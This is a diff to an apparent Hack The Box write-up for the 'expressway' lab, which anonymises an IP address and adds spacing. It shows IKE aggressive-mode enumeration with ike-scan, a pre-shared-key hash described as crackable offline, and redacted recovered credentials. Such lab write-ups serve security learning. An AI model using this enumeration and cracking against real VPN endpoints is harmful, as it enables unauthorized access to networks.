@@ -68,7 +68,7 @@ ike-scan -A expressway.htb
 The aggressive mode handshake returns valuable information:
 
 ```
-10.129.246.130  Aggressive Mode Handshake returned
+10.100.100.100  Aggressive Mode Handshake returned
 HDR=(CKY-R=9805bdde1e964264)
 SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
 KeyExchange(128 bytes)
@@ -80,6 +80,7 @@ Hash(20 bytes)
 ```
 
 Key findings:
+
 - **Username**: `ike@expressway.htb`
 - **Authentication**: Pre-Shared Key (PSK)
 - The hash can be cracked offline
@@ -99,6 +100,7 @@ key "[REDACTED]" matches SHA1 hash [REDACTED-SHA1-HASH]
 ```
 
 Credentials obtained:
+
 - **Username**: `ike`
 - **Password**: `[REDACTED]`
 
